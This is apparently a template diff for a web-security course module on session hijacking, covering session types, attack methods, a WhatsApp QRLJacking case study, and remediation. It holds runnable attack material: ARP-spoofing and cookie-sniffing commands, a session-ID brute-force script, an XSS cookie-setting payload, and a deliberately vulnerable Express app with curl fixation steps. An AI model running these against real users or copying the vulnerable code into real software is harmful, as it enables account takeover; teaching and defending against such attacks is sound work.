@@ -1,0 +1,371 @@
+<%- include('partials/header') %>
+
+<section class="hero fade-in">
+  <span class="hero__badge">Module 04</span>
+  <h1 class="hero__title">Session Hijacking</h1>
+  <p class="hero__subtitle">Understanding sessions, hijacking methods, real-world case studies, exploitation POCs, and defense strategies.</p>
+</section>
+
+<div class="container fade-in">
+
+  <!-- What is a Session? -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 4.1</div>
+      <h2 class="section__title">What is a Session?</h2>
+    </div>
+    <div class="section__content">
+      <p>A <strong>session</strong> is a semi-permanent interactive information interchange between a client and a server. Since HTTP is a stateless protocol (each request is independent), sessions were invented to maintain state across multiple requests. After a user authenticates, the server creates a unique session identifier that is used to track the user's activity.</p>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ Session Types</div>
+      <div class="info-box__content">
+        <ul>
+          <li><strong>Server-Side Sessions:</strong> Session data stored on the server (in memory, Redis, DB). Client only holds a session ID in a cookie. Traditional approach.</li>
+          <li><strong>Client-Side Sessions (JWT):</strong> All session data stored in the token itself. Server is stateless. Modern approach used in SPAs and microservices.</li>
+          <li><strong>Hybrid:</strong> JWT access token for short-lived auth + server-side refresh tokens for session management.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">JavaScript — Session Flow</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code>// Server-Side Session Example
+const session = require('express-session');
+
+app.use(session({
+  secret: 'super-secret-key',
+  resave: false,
+  saveUninitialized: false,
+  cookie: { secure: true, httpOnly: true, maxAge: 1800000 }
+}));
+
+// Login: Create session
+app.post('/login', (req, res) => {
+  // After validating credentials...
+  req.session.userId = user.id;        // Store user info in session
+  req.session.role = user.role;
+  req.session.loginTime = Date.now();
+  // → Server generates session ID → stores in cookie: connect.sid=s%3A...
+  res.redirect('/dashboard');
+});
+
+// Protected route: Read session
+app.get('/dashboard', (req, res) => {
+  if (!req.session.userId) return res.redirect('/login');
+  // Session is valid — user is authenticated
+});</code></pre>
+    </div>
+  </div>
+
+  <!-- Types of Session Attacks -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 4.2</div>
+      <h2 class="section__title">Types of Session Hijacking Attacks</h2>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 1. Session Fixation</div>
+      <div class="info-box__content">
+        <p>The attacker sets (fixes) a victim's session ID <strong>before</strong> the victim logs in. After the victim authenticates with that fixed session ID, the attacker can use it to access the victim's account.</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">HTTP — Session Fixation Attack</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code># Step 1: Attacker obtains a valid session ID from the target site
+GET /login HTTP/1.1
+→ Set-Cookie: SESSIONID=attacker_controlled_id_xyz
+
+# Step 2: Attacker crafts a URL that sets the session for the victim
+# Via URL parameter (if the app accepts it):
+https://bank.com/login?SESSIONID=attacker_controlled_id_xyz
+
+# Or via XSS injection:
+&lt;script&gt;document.cookie="SESSIONID=attacker_controlled_id_xyz"&lt;/script&gt;
+
+# Step 3: Attacker sends the crafted link to the victim
+# "Hey, check out this new feature on the bank website!"
+
+# Step 4: Victim clicks link and logs in
+POST /login HTTP/1.1
+Cookie: SESSIONID=attacker_controlled_id_xyz
+username=victim&password=their_secret_password
+→ Server authenticates and associates the session with the victim
+
+# Step 5: Attacker uses the SAME session ID
+GET /account/balance HTTP/1.1
+Cookie: SESSIONID=attacker_controlled_id_xyz
+→ 200 OK: Balance: $50,000
+# 💀 Attacker is now authenticated as the victim!</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 2. Session Sidejacking</div>
+      <div class="info-box__content">
+        <p>Attacker sniffs session cookies from network traffic, typically on unencrypted WiFi networks. This is what Firesheep exploited. Also called <strong>cookie sidejacking</strong>.</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">Bash — Session Sidejacking</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code># On a public WiFi (coffee shop, airport):
+
+# Step 1: Start ARP spoofing to intercept traffic
+sudo arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1
+# Victim's IP: 192.168.1.50, Gateway: 192.168.1.1
+
+# Step 2: Capture HTTP traffic with session cookies
+sudo tcpdump -i wlan0 -w capture.pcap 'tcp port 80'
+
+# Step 3: Extract cookies from capture
+tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
+→ SESSIONID=victim_session_abc123
+
+# Step 4: Import cookie into attacker's browser
+# Using browser dev tools or cookie editor extension
+# → Set SESSIONID=victim_session_abc123
+# → Refresh → Now logged in as victim! 💀</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 3. Session Prediction</div>
+      <div class="info-box__content">
+        <p>If session IDs are generated using weak/predictable algorithms (sequential numbers, timestamp-based, weak PRNGs), an attacker can predict valid session IDs.</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">Python — Session Prediction</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code># ❌ VULNERABLE: Predictable session IDs
+# Observed pattern:
+# Session 1: sess_1001
+# Session 2: sess_1002
+# Session 3: sess_1003
+# → Clearly sequential!
+
+import requests
+
+# Brute force valid sessions
+for i in range(1000, 2000):
+    session_id = f"sess_{i}"
+    response = requests.get("https://target.com/dashboard",
+                          cookies={"SESSIONID": session_id})
+    if response.status_code == 200 and "Welcome" in response.text:
+        print(f"✅ Valid session found: {session_id}")
+        # → Hijacked someone's session! 💀</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 4. Cross-Site Scripting (XSS) Session Theft</div>
+      <div class="info-box__content">
+        <p>Same as cookie stealing — inject JavaScript to extract session cookies and send to attacker's server. Already covered in the Cookie Stealing module.</p>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 5. Man-in-the-Browser (MITB)</div>
+      <div class="info-box__content">
+        <p>Malware (Trojan) installed in the victim's browser intercepts and modifies web transactions in real-time. Unlike MITM, this happens inside the browser itself, bypassing HTTPS.</p>
+        <p><strong>Examples:</strong> Zeus Trojan, SpyEye — intercepted banking sessions to modify transfer amounts and recipients in real-time.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Real Case Study -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 4.3</div>
+      <h2 class="section__title">Real Case Study: WhatsApp Web Session Hijacking</h2>
+    </div>
+
+    <div class="info-box info-box--example">
+      <div class="info-box__title">🟣 WhatsApp Web QR Code Hijacking</div>
+      <div class="info-box__content">
+        <p><strong>Vulnerability (2015-2019):</strong> Researchers from Check Point discovered a vulnerability called "QRLJacking" that affected WhatsApp Web and other services using QR code authentication.</p>
+        <p><strong>How it worked:</strong></p>
+        <ul>
+          <li>WhatsApp Web uses a QR code to authenticate — when scanned, a session token is transmitted</li>
+          <li>Attacker creates a fake WhatsApp Web page with their own QR code</li>
+          <li>The QR code actually contains the attacker's session request to the real WhatsApp servers</li>
+          <li>When the victim scans the attacker's QR code, thinking it's WhatsApp, the attacker's browser gets authenticated</li>
+          <li>Attacker now has full access to victim's WhatsApp messages in real-time</li>
+        </ul>
+        <p><strong>Impact:</strong> Complete access to all victim's conversations, contacts, and media. The attacker session persisted even after the victim closed their browser.</p>
+        <p><strong>Fix:</strong> WhatsApp added session invalidation when another browser is detected and notification to the phone app when Web session is active.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- POC -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 4.4</div>
+      <h2 class="section__title">POC: Session Fixation Attack Demo</h2>
+    </div>
+
+    <div class="info-box info-box--warning">
+      <div class="info-box__title">⚠️ Educational Purpose Only</div>
+      <div class="info-box__content">This demonstrates session fixation in a controlled lab environment.</div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">JavaScript — Vulnerable App (vulnerable-app.js)</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code>const express = require('express');
+const session = require('express-session');
+const app = express();
+
+app.use(session({
+  secret: 'weak-secret',
+  resave: false,
+  saveUninitialized: true,  // ❌ Creates session BEFORE login
+  // genid not implemented — accepts URL-provided session IDs! ❌
+}));
+
+app.use(express.urlencoded({ extended: true }));
+
+// ❌ VULNERABLE: Accepts session ID from URL query
+app.use((req, res, next) => {
+  if (req.query.SESSIONID) {
+    req.sessionID = req.query.SESSIONID;  // ❌ Session fixation!
+  }
+  next();
+});
+
+app.get('/login', (req, res) => {
+  res.send('&lt;form method="POST" action="/login"&gt;&lt;input name="user"&gt;&lt;input name="pass" type="password"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;');
+});
+
+app.post('/login', (req, res) => {
+  // ❌ DOES NOT regenerate session ID after login!
+  req.session.user = req.body.user;
+  req.session.authenticated = true;
+  res.redirect('/dashboard');
+});
+
+app.get('/dashboard', (req, res) => {
+  if (!req.session.authenticated) return res.redirect('/login');
+  res.send('Welcome, ' + req.session.user + '! Session ID: ' + req.sessionID);
+});</code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">Bash — Attack Steps</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code># Step 1: Attacker creates a fixed session
+curl -c - http://localhost:3000/login?SESSIONID=FIXED_SESSION_123
+
+# Step 2: Attacker sends victim the crafted link
+# "Hey check out this cool site!"
+# → http://localhost:3000/login?SESSIONID=FIXED_SESSION_123
+
+# Step 3: Victim clicks link and logs in with their credentials
+# → Session FIXED_SESSION_123 is now authenticated as victim
+
+# Step 4: Attacker uses the same session
+curl -b "connect.sid=FIXED_SESSION_123" http://localhost:3000/dashboard
+# → "Welcome, victim! Session ID: FIXED_SESSION_123" 💀</code></pre>
+    </div>
+  </div>
+
+  <!-- Remediation -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 4.5</div>
+      <h2 class="section__title">Complete Remediation Guide</h2>
+    </div>
+
+    <div class="info-box info-box--remediation">
+      <div class="info-box__title">✅ Session Security Checklist</div>
+      <div class="info-box__content">
+        <ul>
+          <li>✅ <strong>Regenerate session ID</strong> after login (invalidate old session)</li>
+          <li>✅ Use <strong>cryptographically strong random</strong> session IDs (128-bit minimum)</li>
+          <li>✅ Set <strong>HttpOnly, Secure, SameSite</strong> on session cookies</li>
+          <li>✅ Implement <strong>session timeouts</strong>: idle (15-30 min) + absolute (8-24 hours)</li>
+          <li>✅ <strong>Destroy sessions</strong> on logout (server-side)</li>
+          <li>✅ <strong>Bind sessions</strong> to client fingerprint (IP hash + User-Agent)</li>
+          <li>✅ Use <strong>HTTPS everywhere</strong> to prevent sidejacking</li>
+          <li>✅ Implement <strong>concurrent session detection</strong> (alert on new device)</li>
+          <li>✅ <strong>Never accept session IDs</strong> from URL parameters or POST data</li>
+          <li>✅ Store session data in secure backends (Redis with TLS, not in-memory)</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">JavaScript — Secure Session Implementation</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code>const crypto = require('crypto');
+const session = require('express-session');
+const RedisStore = require('connect-redis').default;
+const redis = require('redis');
+
+const redisClient = redis.createClient({ url: process.env.REDIS_URL });
+
+app.use(session({
+  store: new RedisStore({ client: redisClient }),
+  secret: crypto.randomBytes(32).toString('hex'),
+  resave: false,
+  saveUninitialized: false, // ✅ Don't create until login
+  name: '__Host-sid',       // ✅ Cookie prefix for extra security
+  cookie: {
+    httpOnly: true,         // ✅ No JS access
+    secure: true,           // ✅ HTTPS only
+    sameSite: 'strict',     // ✅ No cross-site
+    maxAge: 1800000         // ✅ 30 min idle timeout
+  }
+}));
+
+// ✅ CRITICAL: Regenerate session ID after login
+app.post('/login', async (req, res) => {
+  const user = await validateCredentials(req.body);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  // Destroy old session and create new one
+  req.session.regenerate((err) => {
+    if (err) return res.status(500).end();
+    req.session.userId = user.id;
+    req.session.role = user.role;
+    req.session.loginTime = Date.now();
+    req.session.clientIP = req.ip;                    // ✅ Bind to IP
+    req.session.userAgent = req.headers['user-agent']; // ✅ Bind to UA
+    res.redirect('/dashboard');
+  });
+});
+
+// ✅ Validate session binding on every request
+app.use((req, res, next) => {
+  if (req.session.userId) {
+    if (req.session.clientIP !== req.ip ||
+        req.session.userAgent !== req.headers['user-agent']) {
+      req.session.destroy();
+      return res.status(401).json({ error: 'Session invalidated — fingerprint mismatch' });
+    }
+  }
+  next();
+});</code></pre>
+    </div>
+  </div>
+
+</div>
+
+<%- include('partials/footer') %>
